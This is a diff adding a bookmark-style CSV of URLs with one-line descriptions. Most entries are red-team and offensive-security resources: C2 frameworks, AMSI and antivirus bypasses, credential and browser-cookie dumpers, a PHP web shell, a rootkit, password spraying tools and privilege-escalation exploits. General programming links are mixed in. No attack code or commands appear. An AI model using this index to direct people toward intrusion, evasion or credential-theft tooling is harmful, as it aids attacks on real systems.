@@ -1,0 +1,1028 @@
+http://0xeb-bp.github.io/blog/2020/06/15/cve-2020-1054-analysis.html, CVE-2020-1054 Analysis
+http://blog.dylan.codes/pwning-windows-event-logging/,The Event Log coupled with Windows Event Forwarding and Sysmon can be extremely powerful in the hand
+http://blog.redxorblue.com/2020/07/one-click-to-compromise-fun-with.html, One Click to Compromise -- Fun With ClickOnce Deployment Manifests 
+http://blog.zorinaq.com/65k-open-tcp-ports-on-openzorinaqcom/,All 65k TCP ports, from 1 to 65535, are open on this web server. It is a useful network diagnostic tool. 
+http://codingo.io/reverse-engineering/ctf/2017/07/25/Decompiling-CSharp-By-Example-with-Cracknet.html,Decompiling C# by Example with Cracknet
+http://csharphelper.com/blog/2013/10/make-a-c-dll-and-use-it-from-excel-vba-code/,This example shows how to make a C# DLL and then use it from VBA code running in Excel. A similar pr
+http://danieltemkin.com/Esolangs/Folders/,Folders is a language where the program is encoded into a directory structure.
+http://davenport.sourceforge.net/ntlm.html,The NTLM Authentication Protocol and Security Support Provider. Abstract. This article seeks to desc
+http://dean.edwards.name/packer/,A Javascript compressor.
+http://natanyellin.com/posts/using-linux-audit-to-track-processes/,I recently wrote that the audit API is the best way to track process lifecycle on Linux for security
+http://phrack.org/papers/escaping_from_freebsd_bhyve.html,Phrack staff website.
+http://redplait.blogspot.com/2020/07/etw-tracing-handles-in-kernel.html,let's continue to dissect ETW (part 1  & 2 ). This time consider how tracing is implemented in the k
+https://0x00sec.org/t/breaking-the-d-link-dir3060-firmware-encryption-recon-part-1/21943,Breaking the D-Link DIR3060 Firmware Encryption - Recon - Part 1
+https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349,The Magic in Hacking (Exploit Development)
+https://0xda.de/blog/2020/02/nginx-for-red-teams/,After my post yesterday about using PROXY protocol for red teams to enable trustless TLS redirectors
+https://0xdf.gitlab.io/2019/03/15/htb-ethereal-cor.html,On of the challenges in Ethereal was having to use a shell comprised of two OpenSSL connections over
+https://aaronrosenmund.com/blog/2020/09/26/ironcat-ransmoware/,I am Ironcat
+https://accessibility.arl.org/standards-best-practices/,What is Accessibility? Web accessibility means creating digital resources on the web that everyone c
+https://activedirectorypro.com/active-directory-user-naming-convention/,This article goes over the most common used naming conventions for creating Windows Active Directory
+https://adapt-and-attack.com/2020/05/12/building-a-com-server-for-initial-execution/,Scripting languages  such as JScript  VBScript and VBA  are commonly used in initial execution paylo
+https://addons.thunderbird.net/en-US/thunderbird/addon/mail-merge/,Create and Save or Send Multiple Individual and Personalized Messages from a Draft
+https://adsecurity.org/?p=2011,Usually Golden Tickets (forged Kerberos TGTs) get all the press  but this post is about Silver Ticke
+https://answers.microsoft.com/en-us/msoffice/forum/all/can-i-remove-tag-x-originating-ip-from-header-e/e5cde56c-b18c-444b-9b30-433fdb08463f,remove tag "x-originating-ip" from header e-mail
+https://astaxie.gitbooks.io/build-web-application-with-golang/en/07.4.html,7.4 Templates. What is a template? Hopefully you're aware of the MVC (Model  View  Controller) desig
+https://aws.amazon.com/ec2/vm-import/,VM Import/Export enables you to easily import virtual machine images from your existing environment
+https://azeria-labs.com/writing-arm-assembly-part-1/,Introduction to ARM Assembly Basics
+https://b4rtik.github.io/posts/antimalware-scan-interface-provider-for-persistence/,Antimalware Scan Interface Provider for Persistence
+https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html,Infrastructure PenTest Series : Part 3 - Exploitation¶. After vulnerability analysis probably  we wo
+https://blog.alexellis.io/golang-json-api-client/,Learn a Golang recipe for parsing JSON from a remote API on the Internet over HTTP. This is beginner
+https://blog.christophetd.fr/automating-the-provisioning-of-active-directory-labs-in-azure/,Leveraging Terraform and Ansible to automate the deployment of Active Directory labs in Azure.
+https://blog.cobaltstrike.com/2016/03/16/my-cobalt-strike-scripts-from-neccdc/,I just returned from the North East Collegiate Cyber Defense Competition event at the University of 
+https://blog.cobaltstrike.com/2020/06/25/cobalt-strike-4-1-the-mark-of-injection/,Cobalt Strike 4.1 is now available. This release introduces a new way to build post-ex tools that wo
+https://blog.cymulate.com/abusing-microsoft-office-online-video,Cymulate’s research team has discovered a way to abuse the Online Video feature on Microsoft Word to
+https://blog.didierstevens.com/programs/virustotal-tools/,virustotal-search.py is a Python program to search https) MD5: 867D6272792965D11317BFB6308E20A9 SHA2
+https://blog.dixitaditya.com/leveraging-xss-to-read-internal-files/,An XSS can be many things but just a simple alert(1).
+https://blog.inspired-sec.com/archive/2017/04/17/Mod-Rewrite-Automatic-Setup.html,Mod_Rewrite Automatic Setup
+https://blog.menasec.net/2021/01/how-to-design-abnormal-child-processes.html,In detection engineering we often encounter attack techniques that result into a system process spaw
+https://blog.netspi.com/get-azurepasswords/,Get-AzurePasswords.ps1 is a PowerShell script for automating the credential gathering process for Mi
+https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/,In this blog I’ll show how database users commonly created for web applications can be used to escal
+https://blog.nviso.eu/2020/02/25/evidence-of-vba-purging-found-in-malicious-documents/,TL;DR We have found malicious Office documents containing VBA source code only  and no compiled code
+https://blog.pentesteracademy.com/hacking-jwt-tokens-bruteforcing-weak-signing-key-hashcat-7dba165e905e,Today we will be exploring another way of hacking JWT tokens signed using weak keys. We will be usin
+https://blog.quarkslab.com/index.html,We LOVE interns! Really. We love them because they bring fresh air to the company and because we see
+https://blog.rapid7.com/2018/05/24/how-to-build-your-own-caller-id-spoofer-part-1/,Purpose Organizations with mature security programs often test their own internal awareness programs
+https://blog.ropnop.com/hosting-clr-in-golang/,Hosting the CLR and executing .NET assemblies from Go
+https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/,tl;dr: this blog post documents some aspects of our research on antivirus software and how we manage
+https://blog.sublimesecurity.com/red-team-techniques-gaining-access-on-an-external-engagement-through-spear-phishing/,There have been a lot of posts about crafting red team phishing campaigns  and most are incomplete. 
+https://blog.thinkst.com/p/canarytokensorg-quick-free-detection.html,Canarytokens.org - Quick Free Detection for the Masses 
+https://blog.xpnsec.com/bring-your-own-vm-mac-edition/,Bring Your Own VM - Mac Edition
+https://blog.xpnsec.com/hiding-your-dotnet-complus-etwenabled/,Hiding your .NET – COMPlus_ETWEnabled
+https://blog.xpnsec.com/protecting-your-malware/,Protecting your Malware
+https://bluescreenofjeff.com/2017-12-05-designing-effective-covert-red-team-attack-infrastructure/,Covert red team attack infrastructure is a topic I’ve covered many times before  but always only in 
+https://blueteamblog.com/18-ways-to-detect-malcious-actions-in-your-active-directory-logs-using-siem,DETECT MALICIOUS ACTIVE DIRECTORY LOGS USING SIEM. 18 WAYS TO DETECT MALICIOUS BEHAVIOUR.
+https://br-sn.github.io/Removing-Kernel-Callbacks-Using-Signed-Drivers/,Intro This PoC was created to learn more about the power of driver exploits  the practical challenge
+https://brutaldev.com/post/checking-if-the-workstation-is-locked,Programatically checking if a workstation is locked
+https://bushidotoken.blogspot.com/2020/04/osint-investigation-wheres-bond.html,OSINT 
+https://carstein.github.io/,I blog about random security related topics  binary ninja stuff  all hope is lost.
+https://cas.vancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/,Windows & Active Directory Exploitation Cheat Sheet and Command Reference
+https://chadduffey.com/2020/07/01/ExploitGuardImageLoads.html,In the previous post we evaluated Exploit Guard controls against a simple buffer overflow vulnerabil
+https://channel9.msdn.com/Shows/Going+Deep,Deep Dives into Windows Internals
+https://cheatography.com/davechild/cheat-sheets/mod-rewrite/,A mod_rewrite Cheat Sheet - a quick reference guide for mod_rewrite  with rewrite flags  regular exp
+https://circuitcellar.com/research-design-hub/building-the-chipjabber-unplugged/,Building the ChipJabber-Unplugged
+https://class.malware.re/,Introduction to Malware Analysis and Reverse Engineering. CS6038/CS5138 Malware Analysis Department 
+https://cognosec.com/bypassing-symantec-endpoint-protection-for-fun-profit-defense-evasion/,A quick demonstration of bypassing Symantec Endpoint  dumping credentials from memory and highlighti
+https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=50318646-6402-48f0-82db-25d00ac3d76c&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments,Cisco SNMP configuration attack with a GRE tunnel  
+https://connormcgarr.github.io/thread-hijacking/,Utilizing Cobalt Strike’s in-memory C capabilities to inject a Beacon implant into a remote process 
+https://convertkit.com/email-deliverability,9 steps to improve email deliverability
+https://corneacristian.medium.com/top-25-xxe-bug-bounty-reports-ab4ca662afad,In this article  we will discuss XXE vulnerability  how to find one  and present 25 disclosed report
+https://corz.org/server/tricks/htaccess2.php,.htaccess files. cool htaccess tricks and tips  how-to  know-how and examples.. a corz-style tutoria
+https://cujo.com/reverse-engineering-go-binaries-with-ghidra/,Analyzing malware written in Go: recovering function names in stripped Go binaries and defining stri
+https://cyc10n3.medium.com/rce-via-server-side-template-injection-ad46f8e0c2ae,In this write-up  we’ll see how I identified a remote code execution vulnerability SSTI
+https://dev.to/techschoolguru/implement-restful-http-api-in-go-using-gin-4ap1,Implement RESTful HTTP API in Go using Gin
+https://dmcxblue.gitbook.io/red-team-notes/,Red Team notes
+https://dnsdumpster.com/,Find dns records in order to identify the Internet footprint of an organization. Recon that enables 
+https://docs.google.com/spreadsheets/d/1JxBbMt4JvGr--G0Pkl3jP9VDTBunR2uD3_faZXDvhxc/edit?usp=sharing,OSINT For Finding People
+https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands,Powershell running remote commands
+https://docs.microsoft.com/en-us/visualstudio/msbuild/property-functions,MSBuild – Property Functions Documentation
+https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exallocatepool2,ExAllocatePool2 function Documentation
+https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-overview,GFlags Overview
+https://docs.microsoft.com/en-us/windows-hardware/drivers/install/using-an-extension-inf-file,Using an Extension INF File
+https://docs.microsoft.com/en-us/windows-insider/active-dev-branch,New Windows 10 features for Insider Preview builds in the Dev Channel.
+https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/exploit-protection-reference,Details on how the Exploit Protection feature works in Windows 10
+https://docs.unity3d.com/Manual/IL2CPP.html,IL2CPP (Intermediate Language To C++) is a Unity-developed scripting backendA framework that powers 
+https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6,How you can very easily use Remote Desktop Services to gain lateral movement through a network  usin
+https://drive.google.com/file/d/1aG_qqRvNW-s5_8vvPk5rJiMSMeNL2uY9/view,Bug Hunters Methodology
+https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view,You Got PWNED Exploiting Email
+https://dr-knz.net/go-calling-convention-x86-64.html,The Go low-level calling convention on x86-64 
+https://duraki.github.io/posts/o/20200214-sketch.app-patch-in-ghidra.html,Patching MacOS Sketch.App for unlimited Trial in Ghidra
+https://ec2instances.info/,Get EC2 Specs and prices 
+https://emojipedia.org/,The emoji search engine. A fast emoji search experience with options to browse every emoji by name  
+https://enigma0x3.net/2015/10/27/targeted-workstation-compromise-with-sccm/,In most Red Team engagements  strategic lateral movement is a must. Unlike a lot of typical network 
+https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/,For those of you who conduct pentests or red team assessments  you are probably aware that there are
+https://evasions.checkpoint.com/,Evasion techniques
+https://exploits.run/analytics-analysis-fbi/,Analyzing Analytics (Featuring: The FBI)
+https://ffprofile.com/?utm_source=www.cyberciti.biz&utm_medium=referral&utm_campaign=nixCraft_Social_Media,Firefox Profilemaker
+https://filippo.io/linux-syscall-table/,Searchable Linux Syscall Table for x86 and x86_64 There are some tables like this around  but they a
+https://flipperzero.one/zero,Tamagotchi for Hackers
+https://fortynorthsecurity.com/blog/introducing-c2concealer/,C2concealer is a python3 command-line tool that generates c2 malleable profiles for use with Cobalt 
+https://fortynorthsecurity.com/blog/remotely-host-msbuild-payloads/,tl;dr Separate your C# payload from a MSBuild XML file and host it remotely on a WebDav server. Red 
+https://francozappa.github.io/about-bias/,Bluetooth Impersonation AttackS
+https://getbootstrap.com/,The most popular HTML  CSS  and JS library in the world.
+https://getutm.app/,Run virtual machines on iOS
+https://girl-germs.com/?p=1538,Domain Controller Security Logs – how to get at them *without* being a Domain Admin
+https://gist.github.com/bohops/f722f1a54d9ac1070350bdcaf2da618b,RDP Eavesdropping and Hijacking
+https://gist.github.com/byt3bl33d3r/de10408a2ac9e9ae6f76ffbe565456c3,Remote AppDomainManager Injection. GitHub Gist: instantly share code  notes  and snippets.
+https://gist.github.com/DanShaqFu/5599eecce8c7428779aa7537e4707196,AMSI Bypass
+https://gist.github.com/gwen001/fcea0edc616be58df9a087fb5f02fb18,onliner to extract params from url
+https://gist.github.com/Hackndo/5560e4e9aa8aa6aad2720e4260d126a3,CrackMapExec module to set as "owned" on BloodHound every target owned by the attacker
+https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5,File Magic Numbers. 
+https://gist.github.com/MarkBaggett/38dcff6a0975f148aa858e924d64c492,http.server cgi backdoor.
+https://gist.github.com/netspooky/57a37b30430b01b05abedf847b90c708,instantly share code  notes  and snippets.
+https://gist.github.com/netspooky/e5ff1d70bdde589097311bc51c95fa35,Payload generator.
+https://gist.github.com/pry0cc/439f4b99ace5408ad9b96f778faf7185,A script that uses interlace and urlcrazy to multi-threadedly check if domains are available for TypoSquats 
+https://gist.github.com/ropnop/fdd4e4ab537821eee5a1a751c044924f,Example Go file embedding multiple .NET executables - go-sharp-loader.go
+https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a,A cheatsheet with commands that can be used to perform kerberos attacks - kerberos_attacks_cheatshee
+https://gist.github.com/teixeira0xfffff/c5333504841978a359c540f837ab0a18,MSBuild - Property functions .
+https://gist.github.com/TheWover/b2b2e427d3a81659942f4e8b9a978dc3,Demonstrates using ntdll.dll!EtwpCreateThreadEtw for local shellcode execution. - EtwpTest.cs
+https://gist.github.com/yowu/f7dc34bd4736a65ff28d,A simple HTTP proxy by Golang.
+https://githacks.org/xerox/nasa-mapper,map a driver into the current process and not into the kernel
+https://githacks.org/xerox/vdm,Vulnerable Driver Manipulation
+https://github.com/0ffffffffh/yummyPaste,paste string formatted byte data block into x64dbg easy. - 0ffffffffh/yummyPaste
+https://github.com/0vercl0k/rp,rp++ is a full-cpp written tool that aims to find ROP sequences in PE/Elf/Mach-O x86/x64 binaries. I
+https://github.com/0xbharath/art-of-packet-crafting-with-scapy,The Art of Packet Crafting with Scapy
+https://github.com/0xbharath/slurp,A blazing fast & feature rich Amazon S3 bucket enumerator. - 0xbharath/slurp
+https://github.com/0xricksanchez/fs-fuzzer,My Material for the HITB presentation. Contribute to 0xricksanchez/fs-fuzzer development by creating
+https://github.com/0xricksanchez/paper_collection,Academic papers related to fuzzing  binary analysis  and exploit dev  which I want to read or have a
+https://github.com/0xthirteen/MoveKit,Cobalt Strike kit for Lateral Movement. 
+https://github.com/adamdriscoll/snek,PowerShell wrapper around Python for .NET  to invoke Python from PowerShell - adamdriscoll/snek
+https://github.com/adamtlangley/gitscraper,A tool which scrapes public github repositories for common naming conventions in variables  folders 
+https://github.com/adnane-X-tebbaa/Katana,A Python Tool For google Hacking. Contribute to adnane-X-tebbaa/Katana development by creating an ac
+https://github.com/adolfintel/Windows10-Privacy,Windows 10 Privacy Guide. Contribute to adolfintel/Windows10-Privacy development by creating an acco
+https://github.com/AFLplusplus/AFLplusplus,The fuzzer afl++ is afl with community patches  qemu 5.1 upgrade  collision-free coverage  enhanced 
+https://github.com/AlexisAhmed/Awesome-Red-Teaming,List of Awesome Red Teaming Resources. Contribute to AlexisAhmed/Awesome-Red-Teaming development by 
+https://github.com/altjx/ipwn/blob/master/smbspider/README.md,SMB Spider Tool
+https://github.com/am0nsec/wspe/tree/master/Fusion/FindAssembly,Find Assembly Tool
+https://github.com/anthemtotheego/SharpExec,Execute commands and lateral move with C#
+https://github.com/ardanlabs/gotraining/tree/master/topics/go/generics,Go Generics Syntax
+https://github.com/armon/go-socks5,SOCKS5 server in Golang.
+https://github.com/Arno0x/WSC2,A WebSocket C2 Tool.
+https://github.com/Arvanaghi/CheckPlease,Sandbox evasion modules written in PowerShell  Python  Go  Ruby  C  C#  Perl  and Rust. - Arvanaghi/
+https://github.com/atxsinn3r/amsiscanner,A C/C++ implementation of Microsoft's Antimalware Scan Interface - atxsinn3r/amsiscanner
+https://github.com/Azure/Stormspotter,Azure Red Team tool for graphing Azure and Azure Active Directory objects - Azure/Stormspotter
+https://github.com/bats3c/shad0w,A post exploitation framework designed to operate covertly on heavily monitored enviroments - bats3c
+https://github.com/BC-SECURITY/Empire,Empire is a PowerShell and Python 3.x post-exploitation framework. - BC-SECURITY/Empire
+https://github.com/BC-SECURITY/Invoke-PrintDemon/blob/master/README.md,Print Demon Tool
+https://github.com/beurtschipper/Depix,Recovers passwords from pixelized screenshots. Contribute to beurtschipper/Depix development by crea
+https://github.com/bigb0sss/RedTeam-OffensiveSecurity/blob/master/01-CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile,Cobalt Strike Mallable C2 Profile Example (Very Detailed)
+https://github.com/BishopFox/sliver,Silver C2 Tool
+https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE,Learn ethical hacking.Learn about reconnaissance windows/linux hacking attacking web technologies an
+https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE,This repository was created and developed by Ammar Amer @cry__pto Only. Updates to this repository w
+https://github.com/bluscreenofjeff/Malleable-C2-Randomizer,A script to randomize Cobalt Strike Malleable C2 profiles and reduce the chances of flagging signatu
+https://github.com/brannondorsey/PassGAN,A Deep Learning Approach for Password Guessing (https://arxiv.org/abs/1709.00440) - brannondorsey/Pa
+https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference,CrackMapExec SMB Usage Resource
+https://github.com/byt3bl33d3r/OffensiveNim,My experiments in weaponizing Nim (https://nim-lang.org/) - byt3bl33d3r/OffensiveNim
+https://github.com/byt3bl33d3r/WitnessMe,Web Inventory tool  takes screenshots of webpages using Pyppeteer (headless Chrome/Chromium) and pro
+https://github.com/c0d3G33k/massCode-Code-execution,massCode Code execution (CVE-2020-8548) Writeup
+https://github.com/capnspacehook/ansible-iptables,Ansible role that applies a strict and secure iptables set of rules with many configurable options -
+https://github.com/captain-woof/Field-Manual,A repo of how stuff works  written/gathered right from the basics  so it serves both as a manual and
+https://github.com/captain-woof/Field-Manual/blob/master/Tools/Firewall/iptables/Very%20Detailed%20Cheatsheet.md,IPTables Cheat Sheet
+https://github.com/CCob/SweetPotato,Local Service to SYSTEM privilege escalation from Windows 7 to Windows 10 / Server 2019 - CCob/Sweet
+https://github.com/cedowens/SwiftBelt,A macOS enumeration tool inspired by harmjoy's Windows-based Seatbelt enumeration tool. - cedowens/S
+https://github.com/chmorgan/sharppcap,Official repository - Fully managed  cross platform (Windows  Mac  Linux) .NET library for capturing
+https://github.com/christophetd/hunting-mindmaps/blob/master/pdf/memory-hunting.pdf,Memory Hunting Mind Map
+https://github.com/christophetd/hunting-mindmaps/blob/master/pdf/windows-basic-event-logs.pdf,Windows Event logs basics mind map
+https://github.com/CiscoCXSecurity/linikatz,linikatz is a tool to attack AD on UNIX. Contribute to CiscoCXSecurity/linikatz development by creat
+https://github.com/clong/DetectionLab,Automate the creation of a lab environment complete with security tooling and logging best practices
+https://github.com/cobbr/PSAmsi,PSAmsi is a tool for auditing and defeating AMSI signatures. - cobbr/PSAmsi
+https://github.com/codingo/crithit,Takes a single wordlist item and tests it one by one over a large collection of hosts before moving 
+https://github.com/coffeegist/cat-sites,Library of sites for categorization. Contribute to coffeegist/cat-sites development by creating an a
+https://github.com/coffeegist/now-you-see-me,Pass-thru web server for traffic redirection. Contribute to coffeegist/now-you-see-me development by
+https://github.com/connormcgarr/Kernel-Exploits/blob/master/README.md,Repository for Kernel Exploits
+https://github.com/coreb1t/awesome-pentest-cheat-sheets/blob/master/README.md,Awesome Pentest Cheat Sheets
+https://github.com/corkami/mitra,A generator of binary polyglots. 
+https://github.com/corkami/pocs/tree/master/mini,Input files of various file types with self-descriptive contents
+https://github.com/cube0x0/SharpeningCobaltStrike,in realtime v35/40 dotnet compiler for your linux Cobalt Strike C2. New fresh compiled and obfuscate
+https://github.com/Cyb3rWard0g/WinRpcFunctions,Windows RPC Functions
+https://github.com/cytopia/pwncat,Netcat on steroids with Firewall  IDS/IPS evasion  bind and reverse shell and port forwarding magic 
+https://github.com/D00MFist/PersistentJXA,Collection of macOS persistence methods and miscellaneous tools in JXA - D00MFist/PersistentJXA
+https://github.com/D3VI5H4/Antivirus-Artifacts/blob/main/AntivirusArtifacts2.pdf,AntiVirus Artifacts 2
+https://github.com/D3VI5H4/Antivirus-Artifacts/blob/main/ANTIVURUS_ARTIFACTS.pdf,AntiVirus Artifacts 1
+https://github.com/D4stiny/spectre,A Windows kernel-mode rootkit that abuses legitimate communication channels to control a machine. - 
+https://github.com/dafthack/MSOLSpray,A password spraying tool for Microsoft Online accounts (Azure/O365). The script logs if a user cred 
+https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt,Param name wordlist
+https://github.com/danielmiessler/SecLists,SecLists is the security tester's companion. It's a collection of multiple types of lists used durin
+https://github.com/danigargu/CVE-2020-0796,CVE-2020-0796 - Windows SMBv3 LPE exploit #SMBGhost - danigargu/CVE-2020-0796
+https://github.com/DarkCoderSc/run-as-attached-networked,RunAsAttached is a program to run a console as another user and keep new console attached to caller 
+https://github.com/DarkCoderSc/win-brute-logon/blob/master/README.md,Win Brute Logon Tool
+https://github.com/deadjakk/Reg1c1de,Reg1c1de: Windows Registry Privesc Scanner
+https://github.com/deepchem/deepchem,Democratizing Deep-Learning for Drug Discovery  Quantum Chemistry  Materials Science and Biology - d
+https://github.com/deepseagirl/degoogle,search Google and extract results directly. skip all the click-through links and other sketchiness -
+https://github.com/DeimosC2/DeimosC2,DeimosC2 is a Golang command and control framework for post-exploitation. - DeimosC2/DeimosC2
+https://github.com/denysdovhan/wtfjs,🤪 A list of funny and tricky JavaScript examples. Contribute to denysdovhan/wtfjs development by cre
+https://github.com/devanshbatham/Awesome-Bugbounty-Writeups,A curated list of bugbounty writeups (Bug type wise)   inspired from https://github.com/ngalongc/bug
+https://github.com/devttys0/libmpsse,Open source library for SPI/I2C control via FTDI chips - devttys0/libmpsse
+https://github.com/dirkjanm/ldapdomaindump,Active Directory information dumper via LDAP. Contribute to dirkjanm/ldapdomaindump development by c
+https://github.com/djhohnstein,Operator at SpecterOps. Kali Contributor. djhohnstein has 140 repositories available. Follow their c
+https://github.com/djhohnstein/SharpChromium,.NET 4.0 CLR Project to retrieve Chromium data  such as cookies  history and saved logins. - djhohns
+https://github.com/dmaasland/mcafee-config-decrypt,Contribute to dmaasland/mcafee-config-decrypt development by creating an account on GitHub.
+https://github.com/dpl0/phrack/blob/master/62/7.txt,Phrack Hacks ( Phrack has great stuff)
+https://github.com/dsnezhkov/TruffleSnout,Iterative  AD discovery toolkit for offensive operations - dsnezhkov/TruffleSnout
+https://github.com/dsopas/assessment-mindset/blob/master/assessment-mindset.png,Security Assessment Mindset Mind Map
+https://github.com/Dump-GUY/ghidra_scripts,Contribute to Dump-GUY/ghidra_scripts development by creating an account on GitHub.
+https://github.com/dwisiswant0/gf-secrets,Secret and/ credential patterns used for gf.
+https://github.com/dwmetz/PSHero,Powershell scripts for DFIR and automation.
+https://github.com/dylanaraps/pure-sh-bible,📖 A collection of pure POSIX sh alternatives to external processes. - dylanaraps/pure-sh-bible
+https://github.com/EasyHook/EasyHook,EasyHook - The reinvention of Windows API Hooking.
+https://github.com/EatonChips/wsh,wsh (pronounced woosh) is a web shell generator and command line interface
+https://github.com/elazarl/goproxy,An HTTP proxy library for Go. Contribute to elazarl/goproxy development by creating an account on Gi
+https://github.com/elsaland/elsa,❄️ Elsa is a minimal  fast and secure runtime for JavaScript and TypeScript written in Go - elsaland
+https://github.com/EncodeGroup/BOF-RegSave,Dumping SAM / SECURITY / SYSTEM registry hives with a Beacon Object File - EncodeGroup/BOF-RegSave
+https://github.com/EnginDemirbilek/NorthStarC2,Web Based Command Control Framework (C2) #C2 #CommandControl #RedTeam #C2Framework - EnginDemirbilek
+https://github.com/entynetproject/proton,Proton Framework is a Windows post-exploitation framework similar to other Windows post-exploitation
+https://github.com/epi052/feroxbuster,A fast  simple  recursive content discovery tool written in Rust. - epi052/feroxbuster
+https://github.com/epinna/tplmap,Server-Side Template Injection and Code Injection Detection and Exploitation Tool - epinna/tplmap
+https://github.com/esaulenka,Ghidra stuff
+https://github.com/eth0izzle/shhgit,Ah shhgit! Find GitHub secrets in real time. Contribute to eth0izzle/shhgit development by creating 
+https://github.com/ethicalhackingplayground/wordlistgen,Generates target specific word lists for Fuzzing with fuff - ethicalhackingplayground/wordlistgen
+https://github.com/ettic-team/dnsbin,The request.bin of DNS request.
+https://github.com/fdiskyou/injectAllTheThings,Seven different DLL injection techniques in one single project. - fdiskyou/injectAllTheThings
+https://github.com/ffuf/ffuf,Fast web fuzzer written in Go. Contribute to ffuf/ffuf development by creating an account on GitHub.
+https://github.com/filedescriptor/untrusted-types,Untrusted Types for DevTools
+https://github.com/fireeye/DueDLLigence,Shellcode runner framework for application whitelisting bypasses and DLL side-loading
+https://github.com/fireeye/gocrack,GoCrack is a management frontend for password cracking tools written in Go - fireeye/gocrack
+https://github.com/fireeye/OfficePurge,VBA purge your Office documents with OfficePurge.
+https://github.com/fireeye/PwnAuth,A web application framework for launching and managing OAuth abuse campaigns.
+https://github.com/FlameOfIgnis/Pwdb-Public,A collection of all the data i could extract from 1 billion leaked credentials from internet. - Flam
+https://github.com/Flangvik/NetLoader,Loads any C# binary in mem  patching AMSI and bypassing Windows Defender - Flangvik/NetLoader
+https://github.com/flozz/p0wny-shell,Single-file PHP shell. Contribute to flozz/p0wny-shell development by creating an account on GitHub.
+https://github.com/ForAllSecure/VulnerabilitiesLab,ForAllSecure Vulnerability Labs ( Good Practice)
+https://github.com/FortyNorthSecurity/C2concealer,C2concealer is a command line tool that generates randomized C2 malleable profiles for use in Cobalt
+https://github.com/FortyNorthSecurity/EXCELntDonut,Excel 4.0 (XLM) Macro Generator for injecting DLLs and EXEs into memory. - FortyNorthSecurity/EXCELn
+https://github.com/FortyNorthSecurity/hot-manchego,Macro-Enabled Excel File Generator (.xlsm) using the EPPlus Library. - FortyNorthSecurity/hot-manche
+https://github.com/FortyNorthSecurity/SqlClient,POC for .NET mssql client for accessing database data through beacon - FortyNorthSecurity/SqlClient
+https://github.com/f-secure-foundry/GoKey,The bare metal Go smart card. Contribute to f-secure-foundry/GoKey development by creating an accoun
+https://github.com/FSecureLABS/captcha_cracking,Helper scripts and tutorial for cracking text-based CAPTCHAs - FSecureLABS/captcha_cracking
+https://github.com/FSecureLABS/physmem2profit,Physmem2profit can be used to create a minidump of a target hosts' LSASS process by analysing physic
+https://github.com/FSecureLABS/SharpGPOAbuse,SharpGPOAbuse is a .NET application written in C# that can be used to take advantage of a user's edi
+https://github.com/fsnotify,File system notifications for Go.
+https://github.com/fsnotify/fsnotify,Cross-platform file system notifications for Go.
+https://github.com/FuzzySecurity/BlueHatIL-2020,BlueHatIL 2020 - Staying # and Bringing Covert Injection Tradecraft to .NET - FuzzySecurity/BlueHatI
+https://github.com/FuzzySecurity/BlueHatIL-2020/tree/master/Usage,Staying # and Bringing Covert Injection Tradecraft to .NET
+https://github.com/FuzzySecurity/Sharp-Suite,My musings with C#. 
+https://github.com/G0ldenGunSec/SharpSecDump,.Net port of the remote SAM + LSA Secrets dumping functionality of impacket's secretsdump.py - G0lde
+https://github.com/gamozolabs/mesos,Binary coverage tool without binary modification for Windows - gamozolabs/mesos
+https://github.com/gdabah/win32k-bugs,Dump of win32k POCs for bugs
+https://github.com/geon/geon.github.com/blob/master/_posts/2016-03-03-dsxyliea.md,Interesting code js
+https://github.com/getify/Functional-Light-JS,Pragmatic  balanced FP in JavaScript. @FLJSBook on twitter. - getify/Functional-Light-JS
+https://github.com/getify/You-Dont-Know-JS,A book series on JavaScript. @YDKJS on twitter. Contribute to getify/You-Dont-Know-JS development by
+https://github.com/GhostPack/Seatbelt,Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" rel
+https://github.com/GhostPack/SharpDPAPI,SharpDPAPI is a C# port of some Mimikatz DPAPI functionality. - GhostPack/SharpDPAPI
+https://github.com/gigajew/PowerDropper,App that generates PowerShell dropper scripts for .NET executables - gigajew/PowerDropper
+https://github.com/gliderlabs/ssh,Easy SSH servers in Golang. Contribute to gliderlabs/ssh development by creating an account on GitHu
+https://github.com/go-gomail/gomail,The best way to send emails in Go. Contribute to go-gomail/gomail development by creating an account
+https://github.com/golem445/Corporate_Masks,8-14 character Hashcat masks based on analysis of 1.5 million NTLM hashes cracked while pentesting -
+https://github.com/google/codesearch,Fast  indexed regexp search over large file trees. Contribute to google/codesearch development by cr
+https://github.com/google/fuzzing/tree/master/dictionaries,Googles Fuzzing lists repo
+https://github.com/google/oss-fuzz,OSS-Fuzz - continuous fuzzing of open source software. - google/oss-fuzz
+https://github.com/googleprojectzero/fuzzilli/tree/master/Cloud,Easy distributed fuzzing with Fuzzilli
+https://github.com/googleprojectzero/symboliclink-testing-tools,This is a small suite of tools to test various symbolic link types of Windows.
+https://github.com/gophish/gophish/issues/1822,Enable SMTP AUTH for the Office 365 account.
+https://github.com/gorilla/websocket/blob/master/examples/echo/server.go,Golang websockets library example
